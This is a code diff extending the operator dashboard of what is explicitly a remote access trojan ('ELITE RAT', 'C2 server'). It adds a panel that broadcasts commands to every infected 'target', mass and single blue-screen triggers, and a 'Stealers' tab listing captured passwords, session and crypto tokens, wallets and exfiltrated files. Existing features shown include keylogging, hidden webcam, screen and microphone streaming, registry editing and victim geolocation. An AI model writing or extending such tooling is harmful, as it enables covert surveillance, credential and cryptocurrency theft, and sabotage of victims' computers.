@@ -7,6 +7,9 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
     <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
         :root {
             --bg-primary: #06080d;
@@ -638,6 +641,20 @@
                     <div>Waiting for targets...</div>
                 </div>
             </div>
+            
+            <!-- Bulk Actions -->
+            <div style="padding: 1rem; border-top: 1px solid var(--border); background: rgba(168, 85, 247, 0.03);">
+                <h3 style="font-size: 0.7rem; text-transform: uppercase; color: var(--purple); margin-bottom: 0.8rem;">Global Commands</h3>
+                <div style="display: flex; flex-direction: column; gap: 0.5rem;">
+                    <input type="text" id="bulk-cmd-input" class="terminal-input" style="font-size: 0.75rem; padding: 0.5rem; border-radius: 6px;" placeholder="Command on all...">
+                    <button class="action-btn" style="width: 100%; font-size: 0.75rem; justify-content: center;" onclick="sendBulkCommand()">🚀 Run on All</button>
+                    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:0.5rem;">
+                        <button class="action-btn" style="font-size: 0.65rem;" onclick="socket.emit('bulk_command', {cmd: 'whoami'})">👤 User Info</button>
+                        <button class="action-btn" style="font-size: 0.65rem;" onclick="socket.emit('bulk_command', {cmd: 'systeminfo'})">ℹ️ SysInfo</button>
+                        <button class="action-btn danger" style="font-size: 0.65rem; grid-column: span 2;" onclick="if(confirm('BSOD ALL?')) socket.emit('bulk_command', {cmd: 'trigger_bsod'})">☠️ MASS BSOD</button>
+                    </div>
+                </div>
+            </div>
         </div>
 
         <!-- Main Panel -->
@@ -659,11 +676,17 @@
                 <button class="tab-btn" data-tab="procs" onclick="switchTab(event, 'procs')">
                     <span class="tab-icon">📊</span> Processes
                 </button>
+                <button class="tab-btn" data-tab="metrics" onclick="switchTab(event, 'metrics')">
+                    <span class="tab-icon">📈</span> Metrics
+                </button>
                 <button class="tab-btn" data-tab="map" onclick="switchTab(event, 'map')">
                     <span class="tab-icon">📍</span> Map
                 </button>
                 <button class="tab-btn" data-tab="reg" onclick="switchTab(event, 'reg')">
                     <span class="tab-icon">🗄️</span> Registry
+                </button>
+                <button class="tab-btn" data-tab="stealer" onclick="switchTab(event, 'stealer')">
+                    <span class="tab-icon">🕵️</span> Stealers
                 </button>
             </div>
 
@@ -700,9 +723,39 @@
                     <button class="action-btn" id="btn-fullscreen" onclick="toggleFullscreen()">🔲 Fullscreen</button>
                     <button class="action-btn" id="btn-audio" onclick="toggleStream('audio')">🎤 Listen Audio</button>
                     <button class="action-btn" id="btn-record" onclick="toggleStream('record')" style="background: rgba(255, 71, 87, 0.2); border-color: #ff4757;">🔴 Start Recording</button>
-                    <button class="action-btn" id="btn-socks" onclick="toggleStream('socks5')">🔗 Start SOCKS5</button>
+                    <button class="action-btn" id="btn-socks" onclick="toggleStream('socks5')">🔗 Toggle SOCKS5</button>
                     <button class="action-btn" onclick="takeScreenshot()">📸 Screenshot</button>
                     <button class="action-btn" onclick="sysInfo()">ℹ️ System Info</button>
+                </div>
+            </div>
+
+            <!-- METRICS -->
+            <div id="metrics" class="tab-content">
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem;">
+                    <div class="terminal-container" style="padding: 1rem;">
+                        <h4 style="margin-bottom: 1rem; font-size: 0.8rem;">CPU Usage (%)</h4>
+                        <canvas id="cpuChart" style="height: 200px;"></canvas>
+                    </div>
+                    <div class="terminal-container" style="padding: 1rem;">
+                        <h4 style="margin-bottom: 1rem; font-size: 0.8rem;">RAM Usage (%)</h4>
+                        <canvas id="ramChart" style="height: 200px;"></canvas>
+                    </div>
+                    <div class="terminal-container" style="grid-column: span 2; padding: 1rem;">
+                        <h4 style="margin-bottom: 1rem; font-size: 0.8rem;">Network Traffic (MB/s)</h4>
+                        <canvas id="netChart" style="height: 250px;"></canvas>
+                    </div>
+                </div>
+            </div>
+
+            <!-- MAP -->
+            <div id="map" class="tab-content">
+                <div id="world-map" style="height: 500px; border-radius: var(--radius); border: 1px solid var(--border);"></div>
+                <div style="margin-top: 1rem; display: flex; gap: 1rem;">
+                    <div class="terminal-container" style="flex: 1; padding: 1rem;">
+                        <h4 style="font-size: 0.8rem; margin-bottom: 0.5rem;">Current Location</h4>
+                        <p id="location-info" style="font-size: 0.8rem; color: var(--text-secondary);">Select a target to view location</p>
+                    </div>
+                    <button class="action-btn" onclick="updateLocation()">📍 Refresh Location</button>
                 </div>
             </div>
 
@@ -749,6 +802,9 @@
                         </div>
                         <div style="border-left: 1px solid var(--border); height: 40px; margin: 0 1rem;" class="hide-mobile"></div>
                         <button class="action-btn" onclick="selfDestruct()" style="background: #ff4757; color: white; border: none; padding: 0.8rem 1.5rem;">💣 Self-Destruct</button>
+                        <button class="action-btn" onclick="triggerBsod('real')" style="background: #0078d7; color: white; border: none; padding: 0.8rem 1.2rem;">🌀 Real BSOD</button>
+                        <button class="action-btn" onclick="triggerBsod('fake')" style="background: #3498db; color: white; border: none; padding: 0.8rem 1.2rem;">🖥️ Fake BSOD</button>
+                        <button class="action-btn" onclick="checkPersistence()" style="border-color: var(--purple); color: var(--purple);">🛡️ Check Persistence</button>
                         <p style="width: 100%; font-size: 0.7rem; color: var(--text-muted); margin-top: 0.5rem;">
                             ⚠️ <b>Self-Destruct</b> will wipe all persistence and delete the client from the target machine permanently.
                         </p>
@@ -847,6 +903,8 @@
                             </select>
                             <input type="text" id="reg-path" class="action-btn" placeholder="Path\\To\\Key" style="flex: 1; text-align: left; padding: 0.3rem;" value="Software\\Microsoft\\Windows\\CurrentVersion">
                             <button class="action-btn" onclick="getRegistry()">Browse</button>
+                            <button class="action-btn" style="border-color: var(--accent); color: var(--accent);" onclick="promptNewReg()">+ New Value</button>
+                        </div>
                         </div>
                     </div>
                     <div style="padding: 1rem; overflow-x: auto;">
@@ -856,12 +914,56 @@
                                     <th style="padding: 0.5rem;">Name</th>
                                     <th style="padding: 0.5rem;">Type</th>
                                     <th style="padding: 0.5rem;">Value</th>
+                                    <th style="padding: 0.5rem;">Actions</th>
                                 </tr>
                             </thead>
                             <tbody id="reg-list-body">
                                 <tr><td colspan="3" style="text-align:center; padding: 2rem; color: var(--text-muted);">Select root/path and click Browse</td></tr>
                             </tbody>
                         </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEALERS TAB -->
+            <div id="stealer" class="tab-content">
+                <div style="display: flex; gap: 1rem; margin-bottom: 2rem;">
+                    <button class="action-btn" style="background: var(--purple); color: white; border: none; padding: 1rem 2rem;" onclick="triggerSteal()">🕵️ Run Full Stealer</button>
+                    <div style="display: flex; gap: 1rem; align-items: center; color: var(--text-muted); font-size: 0.8rem;">
+                        <span>Target: <b id="stealer-target">None</b></span>
+                        <span>Captured Items: <b id="stealer-count">0</b></span>
+                    </div>
+                </div>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem;">
+                    <div class="terminal-container">
+                        <div class="terminal-header" style="background: rgba(168, 85, 247, 0.1);">
+                            <h4 style="color: var(--purple);">🔑 Captured Passwords</h4>
+                        </div>
+                        <div id="stealer-passwords" style="padding: 1rem; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; max-height: 400px; overflow-y: auto;">
+                            No passwords captured yet.
+                        </div>
+                    </div>
+
+                    <div class="terminal-container">
+                        <div class="terminal-header" style="background: rgba(52, 152, 219, 0.1);">
+                            <h4 style="color: var(--info);">📡 Social & Crypto Tokens</h4>
+                        </div>
+                        <div id="stealer-tokens" style="padding: 1rem; font-size: 0.8rem; height: 180px; overflow-y: auto; border-bottom: 1px solid var(--border);">
+                            No session tokens found.
+                        </div>
+                        <div id="stealer-wallets" style="padding: 1rem; font-size: 0.8rem; height: 180px; overflow-y: auto; color: var(--warning);">
+                            No wallets detected.
+                        </div>
+                    </div>
+
+                    <div class="terminal-container" style="grid-column: span 2;">
+                        <div class="terminal-header" style="background: rgba(0, 255, 136, 0.1);">
+                            <h4 style="color: var(--accent);">📄 Automatically Exfiltrated Files</h4>
+                        </div>
+                        <div id="stealer-files" style="padding: 1rem; display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 1rem;">
+                            No sensitive files exfiltrated yet.
+                        </div>
                     </div>
                 </div>
             </div>
@@ -875,87 +977,77 @@
         let screenActive = false;
         let webcamActive = false;
         let isControlEnabled = false;
+        let map, markers = {};
+        let cpuChart, ramChart, netChart;
 
-        /* ===== REMOTE CONTROL LOGIC ===== */
-        const screenCanvas = document.getElementById('screen-canvas');
+        /* ===== INITIALIZATION ===== */
+        window.onload = () => {
+            initMap();
+            initCharts();
+            console.log('🚀 ELITE RAT Pro-Admin Dashboard Loaded');
+        };
 
-        function toggleControl() {
-            if (!requireClient()) return;
-            isControlEnabled = !isControlEnabled;
-            const btn = document.getElementById('btn-control');
-            btn.classList.toggle('active', isControlEnabled);
-            btn.innerHTML = isControlEnabled ? '🎮 Disable Control' : '🎮 Enable Control';
-            showToast(`Remote control ${isControlEnabled ? 'ENABLED' : 'DISABLED'}`, isControlEnabled ? 'success' : 'info');
-            
-            if (isControlEnabled) {
-                screenCanvas.style.cursor = 'none'; // Hide local cursor over stream
-            } else {
-                screenCanvas.style.cursor = 'default';
-            }
+        function initMap() {
+            try {
+                if (document.getElementById('world-map')) {
+                    map = L.map('world-map').setView([20, 0], 2);
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                        attribution: '&copy; OpenStreetMap'
+                    }).addTo(map);
+                }
+            } catch (e) { console.error("Map init error:", e); }
         }
 
-        function toggleFullscreen() {
-            const container = screenCanvas.parentElement;
-            if (!document.fullscreenElement) {
-                container.requestFullscreen().catch(err => {
-                    showToast(`Fullscreen error: ${err.message}`, 'error');
+        function initCharts() {
+            const commonOptions = {
+                responsive: true,
+                maintainAspectRatio: false,
+                scales: { 
+                    y: { beginAtZero: true, grid: { color: 'rgba(255,255,255,0.05)' }, border: { display: false } },
+                    x: { display: false }
+                },
+                plugins: { legend: { display: false } },
+                elements: { line: { tension: 0.4 }, point: { radius: 0 } }
+            };
+
+            const cpuEl = document.getElementById('cpuChart');
+            if (cpuEl) {
+                cpuChart = new Chart(cpuEl, {
+                    type: 'line',
+                    data: { labels: [], datasets: [{ data: [], borderColor: '#00ff88', borderWidth: 2, fill: true, backgroundColor: 'rgba(0,255,136,0.1)' }] },
+                    options: commonOptions
                 });
-            } else {
-                document.exitFullscreen();
+            }
+
+            const ramEl = document.getElementById('ramChart');
+            if (ramEl) {
+                ramChart = new Chart(ramEl, {
+                    type: 'line',
+                    data: { labels: [], datasets: [{ data: [], borderColor: '#3498db', borderWidth: 2, fill: true, backgroundColor: 'rgba(52,152,219,0.1)' }] },
+                    options: commonOptions
+                });
+            }
+
+            const netEl = document.getElementById('netChart');
+            if (netEl) {
+                netChart = new Chart(netEl, {
+                    type: 'line',
+                    data: { 
+                        labels: [], 
+                        datasets: [
+                            { label: 'Sent', data: [], borderColor: '#ff4757', borderWidth: 2 },
+                            { label: 'Recv', data: [], borderColor: '#ffa502', borderWidth: 2 }
+                        ] 
+                    },
+                    options: { ...commonOptions, plugins: { legend: { display: true, labels: { color: '#8b949e', boxWidth: 10 } } } }
+                });
             }
         }
-
-        // Mouse Events
-        screenCanvas.addEventListener('mousemove', (e) => {
-            if (!isControlEnabled || !selectedClient) return;
-            const rect = screenCanvas.getBoundingClientRect();
-            const x = (e.clientX - rect.left) / rect.width;
-            const y = (e.clientY - rect.top) / rect.height;
-            socket.emit('mouse_move', { client_id: selectedClient, x: x, y: y });
-        });
-
-        screenCanvas.addEventListener('mousedown', (e) => {
-            if (!isControlEnabled || !selectedClient) return;
-            const buttons = ['left', 'middle', 'right'];
-            socket.emit('mouse_click', { client_id: selectedClient, btn: buttons[e.button], action: 'down' });
-        });
-
-        screenCanvas.addEventListener('mouseup', (e) => {
-            if (!isControlEnabled || !selectedClient) return;
-            const buttons = ['left', 'middle', 'right'];
-            socket.emit('mouse_click', { client_id: selectedClient, btn: buttons[e.button], action: 'up' });
-        });
-
-        screenCanvas.addEventListener('contextmenu', (e) => {
-            if (isControlEnabled) e.preventDefault();
-        });
-
-        screenCanvas.addEventListener('wheel', (e) => {
-            if (!isControlEnabled || !selectedClient) return;
-            socket.emit('scroll', { client_id: selectedClient, delta: e.deltaY * -1 });
-            e.preventDefault();
-        }, { passive: false });
-
-        // Keyboard Events
-        window.addEventListener('keydown', (e) => {
-            if (!isControlEnabled || !selectedClient) return;
-            // Prevent some browser shortcuts
-            if (['F5', 'F12', 'F11'].includes(e.key)) return;
-            
-            socket.emit('key_press', { client_id: selectedClient, key: e.key.toLowerCase(), action: 'down' });
-            if (e.target === document.body || e.target === screenCanvas) {
-                e.preventDefault();
-            }
-        });
-
-        window.addEventListener('keyup', (e) => {
-            if (!isControlEnabled || !selectedClient) return;
-            socket.emit('key_press', { client_id: selectedClient, key: e.key.toLowerCase(), action: 'up' });
-        });
 
         /* ===== TOAST SYSTEM ===== */
         function showToast(message, type = 'info') {
             const container = document.getElementById('toast-container');
+            if (!container) return;
             const toast = document.createElement('div');
             toast.className = `toast ${type}`;
             const icons = { success: '✅', error: '❌', info: 'ℹ️' };
@@ -969,20 +1061,26 @@
 
         /* ===== SOCKET EVENTS ===== */
         socket.on('connect', () => {
-            document.getElementById('connection-dot').style.background = 'var(--accent)';
-            document.getElementById('connection-status').textContent = 'Connected';
+            const dot = document.getElementById('connection-dot');
+            const status = document.getElementById('connection-status');
+            if (dot) dot.style.background = 'var(--accent)';
+            if (status) status.textContent = 'Connected';
             socket.emit('dashboard_join');
             showToast('Connected to C2 server', 'success');
         });
 
         socket.on('disconnect', () => {
-            document.getElementById('connection-dot').style.background = 'var(--danger)';
-            document.getElementById('connection-status').textContent = 'Disconnected';
+            const dot = document.getElementById('connection-dot');
+            const status = document.getElementById('connection-status');
+            if (dot) dot.style.background = 'var(--danger)';
+            if (status) status.textContent = 'Disconnected';
             showToast('Lost connection to server', 'error');
         });
 
         socket.on('clients_update', (data) => {
             renderClients(data.clients);
+            const countEl = document.getElementById('client-count-num');
+            if (countEl) countEl.textContent = data.clients.filter(c => c.status === 'online').length;
         });
 
         socket.on('cmd_output', (data) => {
@@ -1006,318 +1104,567 @@
         socket.on('keys_update', (data) => {
             if (selectedClient && data.client_id === selectedClient) {
                 const el = document.getElementById('keylog-output');
-                el.textContent += data.keys;
-                el.scrollTop = el.scrollHeight;
+                if (el) {
+                    if (el.textContent.includes('Waiting')) el.textContent = '';
+                    el.textContent += data.keys;
+                    el.scrollTop = el.scrollHeight;
+                }
+            }
+        });
+
+        socket.on('metrics_update', (data) => {
+            if (data.client_id !== selectedClient) return;
+            const m = data.metrics;
+            const now = new Date().toLocaleTimeString();
+
+            if (cpuChart && ramChart) {
+                [cpuChart, ramChart].forEach((chart, i) => {
+                    const val = i === 0 ? m.cpu : m.ram;
+                    chart.data.labels.push(now);
+                    chart.data.datasets[0].data.push(val);
+                    if (chart.data.labels.length > 30) { chart.data.labels.shift(); chart.data.datasets[0].data.shift(); }
+                    chart.update('none');
+                });
+            }
+
+            if (netChart) {
+                netChart.data.labels.push(now);
+                netChart.data.datasets[0].data.push(m.net_sent / 1024 / 1024);
+                netChart.data.datasets[1].data.push(m.net_recv / 1024 / 1024);
+                if (netChart.data.labels.length > 30) { netChart.data.labels.shift(); netChart.data.datasets.forEach(d => d.data.shift()); }
+                netChart.update('none');
             }
         });
 
         socket.on('process_list', (data) => {
             if (selectedClient && data.client_id === selectedClient) {
-                renderProcesses(data.processes);
+                const tbody = document.getElementById('process-list-body');
+                if (!tbody) return;
+                tbody.innerHTML = '';
+                if (data.processes && data.processes.length > 0) {
+                    data.processes.forEach(p => {
+                        const tr = document.createElement('tr');
+                        tr.style.borderBottom = '1px solid var(--border)';
+                        tr.innerHTML = `
+                            <td style="padding:0.5rem;">${p.pid}</td>
+                            <td style="padding:0.5rem; color:var(--accent);">${p.name}</td>
+                            <td style="padding:0.5rem;">${p.cpu || 0}%</td>
+                            <td style="padding:0.5rem;">${p.mem || 0} MB</td>
+                            <td style="padding:0.5rem;"><button class="action-btn danger" style="padding:0.2rem 0.5rem; font-size:0.6rem;" onclick="killProcess(${p.pid})">Kill</button></td>
+                        `;
+                        tbody.appendChild(tr);
+                    });
+                } else {
+                    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:2rem; color:var(--text-muted);">No processes found</td></tr>';
+                }
+            }
+        });
+        socket.on('registry_list', (data) => {
+            if (selectedClient && data.client_id === selectedClient) {
+                const tbody = document.getElementById('reg-list-body');
+                if (!tbody) return;
+                tbody.innerHTML = '';
+                if (data.items && data.items.length > 0) {
+                    data.items.forEach(item => {
+                        const tr = document.createElement('tr');
+                        tr.style.borderBottom = '1px solid var(--border)';
+                        
+                        const isKey = item.type === 'key';
+                        const name = item.name;
+                        const value = item.value || '';
+                        const typeId = item.type_id || 1; // REG_SZ default
+
+                        tr.innerHTML = `
+                            <td style="padding:0.5rem; color:${isKey?'var(--accent)':'var(--text-primary)'}">${isKey?'📁 ':''}${name}</td>
+                            <td style="padding:0.5rem; font-size:0.7rem; color:var(--text-muted)">${item.type}</td>
+                            <td style="padding:0.5rem; max-width:200px; overflow:hidden; text-overflow:ellipsis;">${value}</td>
+                            <td style="padding:0.5rem; display:flex; gap:0.3rem;">
+                                ${!isKey ? `<button class="action-btn" style="padding:0.2rem 0.5rem; font-size:0.6rem;" onclick="editReg('${name}', '${value}', ${typeId})">Edit</button>` : ''}
+                                <button class="action-btn danger" style="padding:0.2rem 0.5rem; font-size:0.6rem;" onclick="deleteReg('${name}', ${isKey})">Del</button>
+                            </td>
+                        `;
+                        tbody.appendChild(tr);
+                    });
+                } else {
+                    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:2rem; color:var(--text-muted);">No entries found</td></tr>';
+                }
             }
         });
 
-        socket.on('registry_list', (data) => {
+        // Audio Streaming logic
+        let audioCtx, nextAudioTime = 0;
+        socket.on('audio_data', (data) => {
             if (selectedClient && data.client_id === selectedClient) {
-                renderRegistry(data.items, data.path, data.root);
+                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const binaryData = atob(data.data);
+                const bytes = new Uint8Array(binaryData.length);
+                for (let i = 0; i < binaryData.length; i++) bytes[i] = binaryData.charCodeAt(i);
+                
+                const f32 = new Float32Array(bytes.buffer);
+                const audioBuffer = audioCtx.createBuffer(1, f32.length, 44100);
+                audioBuffer.getChannelData(0).set(f32);
+                
+                const source = audioCtx.createBufferSource();
+                source.buffer = audioBuffer;
+                source.connect(audioCtx.destination);
+                
+                const startTime = Math.max(audioCtx.currentTime, nextAudioTime);
+                source.start(startTime);
+                nextAudioTime = startTime + audioBuffer.duration;
             }
         });
 
         socket.on('file_list', (data) => {
             if (selectedClient && data.client_id === selectedClient) {
-                renderFiles(data.files, data.path);
+                renderFileList(data.path, data.files);
             }
         });
 
-        /* ===== RENDER CLIENTS ===== */
+        socket.on('toast', (data) => showToast(data.msg, data.type));
+
+        /* ===== CORE ACTIONS ===== */
+        function selectClient(clientId, evt) {
+            selectedClient = clientId;
+            document.querySelectorAll('.client-item').forEach(el => el.classList.remove('active'));
+            if (evt) evt.currentTarget.classList.add('active');
+            
+            // Clear previous graphs
+            [cpuChart, ramChart, netChart].forEach(c => {
+                if (c) {
+                    c.data.labels = [];
+                    c.data.datasets.forEach(d => d.data = []);
+                    c.update();
+                }
+            });
+            
+            const keylogEl = document.getElementById('keylog-output');
+            if (keylogEl) keylogEl.textContent = 'Waiting for keystrokes...';
+
+            showToast(`Selected: ${clientId.substring(0,8)}`, 'success');
+        }
+
         function renderClients(clients) {
             const container = document.getElementById('clients-list');
-            document.getElementById('client-count-num').textContent = clients.length;
-
+            if (!container) return;
             if (clients.length === 0) {
-                container.innerHTML = `
-                    <div class="no-clients">
-                        <div class="icon">📡</div>
-                        <div>Waiting for targets...</div>
-                    </div>`;
+                container.innerHTML = `<div class="no-clients"><div class="icon">📡</div><div>Waiting for targets...</div></div>`;
                 return;
             }
-
             container.innerHTML = clients.map(c => `
-                <div class="client-item ${selectedClient === c.id ? 'active' : ''}"
-                     onclick="selectClient('${c.id}', event)">
+                <div class="client-item ${selectedClient === c.id ? 'active' : ''}" onclick="selectClient('${c.id}', event)">
                     <div class="client-top">
-                        <div class="client-id">${c.id}</div>
-                        <span class="status-badge ${c.status}">${c.status.toUpperCase()}</span>
+                        <span class="client-id">${c.id.substring(0,12)}</span>
+                        <span class="status-badge ${c.status}">${c.status}</span>
                     </div>
                     <div class="client-meta">
                         <span>🌐 ${c.ip}</span>
                         <span>💻 ${c.os}</span>
                     </div>
+                    <div style="font-size: 0.65rem; color: var(--accent); margin-top: 0.4rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                        🪟 ${c.active_window || 'Desktop'}
+                    </div>
+                    <div style="font-size: 0.6rem; color: var(--purple); margin-top: 0.2rem;">
+                        🛡️ Persistence: <span style="color:var(--text-secondary)">Active</span> | 🕵️ Items: <span style="color:var(--text-secondary)">${c.stolen_count || 0}</span>
+                    </div>
                 </div>
             `).join('');
         }
 
-        /* ===== CLIENT SELECTION ===== */
-        function selectClient(clientId, evt) {
-            selectedClient = clientId;
-            document.querySelectorAll('.client-item').forEach(el => el.classList.remove('active'));
-            if (evt) {
-                const item = evt.target.closest('.client-item');
-                if (item) item.classList.add('active');
-            }
-            showToast(`Target selected: ${clientId}`, 'success');
-        }
-
-        function requireClient() {
-            if (!selectedClient) {
-                showToast('Select a target first!', 'error');
-                return false;
-            }
-            return true;
-        }
-
-        /* ===== TAB SWITCHING ===== */
         function switchTab(evt, tabName) {
             document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            document.getElementById(tabName).classList.add('active');
-            if (evt && evt.currentTarget) {
-                evt.currentTarget.classList.add('active');
-            }
+            const tab = document.getElementById(tabName);
+            if (tab) tab.classList.add('active');
+            if (evt) evt.currentTarget.classList.add('active');
+            if (tabName === 'map' && map) setTimeout(() => map.invalidateSize(), 200);
+            if (tabName === 'stealer') refreshStealerData();
         }
 
-        /* ===== STREAM CONTROLS ===== */
-        function toggleStream(type) {
-            if (!requireClient()) return;
-
-            if (type === 'screen') {
-                screenActive = !screenActive;
-                document.getElementById('screen-canvas').style.display = screenActive ? 'block' : 'none';
-                document.getElementById('screen-placeholder').style.display = screenActive ? 'none' : 'flex';
-                document.getElementById('screen-live-badge').classList.toggle('visible', screenActive);
-                document.getElementById('btn-screen').classList.toggle('active', screenActive);
-            } else {
-                webcamActive = !webcamActive;
-                document.getElementById('webcam-canvas').style.display = webcamActive ? 'block' : 'none';
-                document.getElementById('webcam-placeholder').style.display = webcamActive ? 'none' : 'flex';
-                document.getElementById('webcam-live-badge').classList.toggle('visible', webcamActive);
-                document.getElementById('btn-webcam').classList.toggle('active', webcamActive);
-            }
-
-            socket.emit('toggle_stream', {
-                client_id: selectedClient,
-                stream_type: type,
-                enabled: type === 'screen' ? screenActive : webcamActive
-            });
-
-            const label = type === 'screen' ? 'Desktop' : 'Webcam';
-            const state = (type === 'screen' ? screenActive : webcamActive) ? 'ON' : 'OFF';
-            showToast(`${label} stream: ${state}`, 'info');
+        function requireClient() {
+            if (!selectedClient) { showToast('Select a target first!', 'error'); return false; }
+            return true;
         }
 
-        function renderFrame(canvasId, b64image) {
-            const canvas = document.getElementById(canvasId);
-            const ctx = canvas.getContext('2d');
-            const img = new Image();
-            img.onload = () => {
-                // Resize canvas only if needed
-                if (canvas.width !== img.width || canvas.height !== img.height) {
-                    canvas.width = img.width;
-                    canvas.height = img.height;
-                }
-                ctx.drawImage(img, 0, 0);
-            };
-            img.src = 'data:image/jpeg;base64,' + b64image;
-        }
-
-        /* ===== TERMINAL ===== */
+        /* ===== FEATURE ACTIONS ===== */
         function executeCmd() {
             if (!requireClient()) return;
-            const input = document.getElementById('cmd-input');
-            const cmd = input.value.trim();
+            const input = document.getElementById('cmd-input'), cmd = input.value.trim();
             if (!cmd) return;
-
             appendTerminal(`\n❯ ${cmd}`, '#00ff88');
             fetch(`/api/clients/${selectedClient}/cmd`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ cmd: cmd })
-            }).then(r => r.json()).then(data => {
-                if (data.error) {
-                    appendTerminal(`[ERROR] ${data.error}`, '#ff4757');
-                }
-            }).catch(err => {
-                appendTerminal(`[FETCH ERROR] ${err.message}`, '#ff4757');
+                body: JSON.stringify({ cmd })
             });
             input.value = '';
         }
 
-        function appendTerminal(text, color) {
-            const output = document.getElementById('cmd-output');
-            if (color) {
-                const span = document.createElement('span');
-                span.style.color = color;
-                span.textContent = text + '\n';
-                output.appendChild(span);
-            } else {
-                output.textContent += text + '\n';
-            }
-            output.scrollTop = output.scrollHeight;
-        }
-
-        function clearTerminal() {
-            document.getElementById('cmd-output').innerHTML = '';
-            showToast('Terminal cleared', 'info');
-        }
-
-        /* ===== ACTIONS ===== */
-        function takeScreenshot() {
-            if (!requireClient()) return;
-            socket.emit('toggle_stream', { client_id: selectedClient, stream_type: 'screenshot', enabled: true });
-            showToast('Screenshot requested', 'info');
-        }
-
-        function sysInfo() {
-            if (!requireClient()) return;
-            fetch(`/api/clients/${selectedClient}/cmd`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ cmd: 'systeminfo' })
-            });
-            showToast('System info requested', 'info');
-        }
-
-        function recordAudio() {
-            if (!requireClient()) return;
-            socket.emit('toggle_stream', { client_id: selectedClient, stream_type: 'audio', enabled: true });
-            showToast('Audio recording started (10s)', 'info');
-        }
-
-        function listDirectory() {
-            if (!requireClient()) return;
-            socket.emit('toggle_stream', { client_id: selectedClient, stream_type: 'list_files', enabled: true });
-            showToast('Dir listing requested', 'info');
-        }
-
-        function uploadFile() {
-            if (!requireClient()) return;
-            document.getElementById('file-upload').click();
-            showToast('Select a file to upload', 'info');
-        }
-
-        function downloadFile() {
-            if (!requireClient()) return;
-            const filename = prompt('Enter remote file path:');
-            if (filename) {
-                socket.emit('toggle_stream', { client_id: selectedClient, stream_type: 'download', enabled: true, path: filename });
-                showToast(`Download requested: ${filename}`, 'info');
+        function sendBulkCommand() {
+            const input = document.getElementById('bulk-cmd-input'), cmd = input.value.trim();
+            if (!cmd) return;
+            if (confirm(`Execute "${cmd}" on ALL targets?`)) {
+                socket.emit('bulk_command', { cmd });
+                input.value = '';
+                showToast('Bulk command broadcasted', 'info');
             }
         }
 
-        function flushKeys() {
+        function toggleStream(type) {
             if (!requireClient()) return;
-            socket.emit('toggle_stream', { client_id: selectedClient, stream_type: 'keylog', enabled: true });
-            showToast('Keylog refresh requested', 'info');
+            let active = false;
+            if (type === 'screen') {
+                screenActive = !screenActive; active = screenActive;
+                document.getElementById('screen-canvas').style.display = active ? 'block' : 'none';
+                document.getElementById('screen-placeholder').style.display = active ? 'none' : 'flex';
+                document.getElementById('screen-live-badge').classList.toggle('visible', active);
+            } else if (type === 'webcam') {
+                webcamActive = !webcamActive; active = webcamActive;
+                document.getElementById('webcam-canvas').style.display = active ? 'block' : 'none';
+                document.getElementById('webcam-placeholder').style.display = active ? 'none' : 'flex';
+                document.getElementById('webcam-live-badge').classList.toggle('visible', active);
+            }
+            socket.emit('toggle_stream', { client_id: selectedClient, stream_type: type, enabled: active });
+            showToast(`${type} stream ${active?'ON':'OFF'}`, 'info');
         }
 
-        /* ===== PHASE 4 NEW ACTIONS ===== */
-        function getProcesses() {
-            if (!requireClient()) return;
-            socket.emit('get_processes', { client_id: selectedClient });
-            showToast('Process list requested', 'info');
+        function renderFrame(canvasId, b64) {
+            const canvas = document.getElementById(canvasId);
+            if (!canvas) return;
+            const ctx = canvas.getContext('2d'), img = new Image();
+            img.onload = () => { canvas.width = img.width; canvas.height = img.height; ctx.drawImage(img, 0, 0); };
+            img.src = 'data:image/jpeg;base64,' + b64;
         }
 
-        function renderProcesses(processes) {
-            const body = document.getElementById('process-list-body');
-            body.innerHTML = processes.map(p => `
-                <tr style="border-bottom: 1px solid rgba(255,255,255,0.03);">
-                    <td style="padding: 0.6rem; color: var(--text-muted);">${p.pid}</td>
-                    <td style="padding: 0.6rem; font-weight: 500;">${p.name}</td>
-                    <td style="padding: 0.6rem; color: var(--accent);">${p.cpu.toFixed(1)}%</td>
-                    <td style="padding: 0.6rem; color: var(--info);">${p.mem.toFixed(1)}</td>
-                    <td style="padding: 0.6rem;">
-                        <button class="action-btn danger" style="padding: 0.2rem 0.5rem; font-size: 0.65rem;" 
-                                onclick="killProcess(${p.pid})">KILL</button>
-                    </td>
-                </tr>
-            `).join('');
-        }
-
-        function killProcess(pid) {
-            if (!confirm(`Are you sure you want to terminate PID ${pid}?`)) return;
-            socket.emit('kill_process', { client_id: selectedClient, pid: pid });
-            showToast(`Termination command sent for ${pid}`, 'warning');
-        }
-
-        function fetchLocation() {
+        function updateLocation() {
             if (!requireClient()) return;
             fetch(`/api/clients/${selectedClient}/location`)
                 .then(r => r.json())
                 .then(data => {
-                    const title = document.getElementById('loc-city-country');
-                    title.textContent = `${data.city || 'Unknown'}, ${data.country || 'Unknown'}`;
-                    document.getElementById('loc-details').innerHTML = `
-                        IP Address: <b>${data.query || 'N/A'}</b><br>
-                        ISP: <b>${data.isp || 'N/A'}</b><br>
